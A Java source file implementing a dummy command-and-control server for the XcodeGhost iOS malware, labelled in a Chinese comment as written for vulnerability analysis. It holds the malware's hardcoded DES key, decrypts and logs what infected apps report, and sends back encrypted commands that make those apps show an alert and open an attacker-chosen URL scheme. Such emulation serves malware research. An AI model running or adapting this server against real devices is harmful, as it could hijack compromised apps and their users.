package com.tdt.server.httpserver.sample;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.security.SecureRandom;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

import com.tdt.server.httpserver.core.Request;
import com.tdt.server.httpserver.core.Response;
import com.tdt.server.httpserver.core.impl.HttpHandler;

import snippet.Snippet;

/**
 * XCodeGhost 服务器
 * 本代码片段仅作漏洞分析之用
 * @author zhaoming23@gmail.com
 *
 */
public class GhostHandler extends HttpHandler{

	/** XcodeGhost 秘钥 */
	public static final String pw = "stringWithFormat";
	
	@Override
	public void doGet(Request request, Response response) {
		response.write("I am dummy XcodeGhost server for \"init.icloud-analysis.com\"");
	}
	
	@Override
	public void doPost(Request request, Response response) {
		Map<String, List<String>> headerMap = request.getHeaderMap();
		Iterator<Entry<String, List<String>>> iterator = headerMap.entrySet().iterator();
		while(iterator.hasNext()) {
			Entry<String, List<String>> next = iterator.next();
			if(next.getKey().equals("User-agent")) {
				try {
					System.out.println(">>> debug:User-agent=" + URLDecoder.decode(next.getValue().toString(), "UTF-8"));
				} catch (UnsupportedEncodingException e) {
				}
			} else {
				System.out.println(next);
			}
				
		}
		InputStream requestBody = request.getRequestBody();
		try {
			//1、请求byte[]
			byte[] src = Snippet.readBytes(requestBody);
			
			ByteArrayOutputStream b = new ByteArrayOutputStream();
			int a = 0;
			byte[] headBytes = new byte[8];
			for(byte e : src) {
				if(a < 8) {
					headBytes[a++] = e;
					continue;
				}
				b.write(e);
			}
			b.flush();
			b.close();
			//2、去掉头
			byte[] byteArray = b.toByteArray();
			//3、解密
			byte[] decrypt = decrypt(byteArray, pw);
			//4、转成字符
			String decryptRequest = new String(decrypt, Charset.forName("UTF-8"));
			System.out.println(">>> debug=request-decrypt-str:" + decryptRequest);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		StringBuffer sb = new StringBuffer();
		
		sb.append("{");
		sb.append("\"sleep\":0,");
		sb.append("\"showDelay\":0,");
		sb.append("\"alertHeader\":\"XCodeGhost\",");
		sb.append("\"alertBody\":\"Hi, I'm Mike XCodeGhost\",");
		sb.append("\"appID\":\"0\",");
		sb.append("\"cancelTitle\":\"Cancel\",");
		sb.append("\"confirmTitle\":\"Go\",");
		
		String playload = "weixin://";
//		String playload = "weixin_schema://";
//		String playload = "http://www.baidu.com";
//		String playload = "tel://123";
		
		sb.append("\"scheme\":\"" + playload +"\",");
		sb.append("\"configUrl\":\"" + playload + "\"");
		sb.append("}");
		
		//1、转byte[]
		byte[] bytes = sb.toString().getBytes(Charset.forName("UTF-8"));
		
		//2、加密
		byte[] encrypt = encrypt(bytes, pw);
		ByteArrayOutputStream responseBytes = new ByteArrayOutputStream();
		try {
			for (int i = 0; i < 8; i++) {
				responseBytes.write(new byte[1]);
			}
			
			for(byte e : encrypt) {
				responseBytes.write(e);
			}
			responseBytes.flush();
			responseBytes.close();
		} catch (IOException e1) {
		}
		System.out.println("<<< debug=response:" + sb.toString());
		System.out.println("<<< debug=response-length:" + encrypt.length);
		//3、加头
		response.writeBytes(responseBytes.toByteArray());
		
	}
	
	/** 解密 */
	public static byte[] encrypt(byte[] datasource, String password) {
		try {
			SecureRandom random = new SecureRandom();
			DESKeySpec desKey = new DESKeySpec(password.getBytes());
			// 创建一个密匙工厂，然后用它把DESKeySpec转换成
			SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
			SecretKey securekey = keyFactory.generateSecret(desKey);
			// Cipher对象实际完成加密操作
			Cipher cipher = Cipher.getInstance("DES");
			// 用密匙初始化Cipher对象
			cipher.init(Cipher.ENCRYPT_MODE, securekey, random);
			// 现在，获取数据并加密
			// 正式执行加密操作
			return cipher.doFinal(datasource);
		} catch (Throwable e) {
			e.printStackTrace();
		}
		return null;
	}
	
	/** 加密 */
	public static byte[] decrypt(byte[] src, String password) throws Exception {
		// DES算法要求有一个可信任的随机数源
		SecureRandom random = new SecureRandom();
		// 创建一个DESKeySpec对象
		DESKeySpec desKey = new DESKeySpec(password.getBytes());
		// 创建一个密匙工厂
		SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
		// 将DESKeySpec对象转换成SecretKey对象
		SecretKey securekey = keyFactory.generateSecret(desKey);
		// Cipher对象实际完成解密操作
		Cipher cipher = Cipher.getInstance("DES");
		// 用密匙初始化Cipher对象
		cipher.init(Cipher.DECRYPT_MODE, securekey, random);
		// 真正开始解密操作
		return cipher.doFinal(src);
	}
	
	
}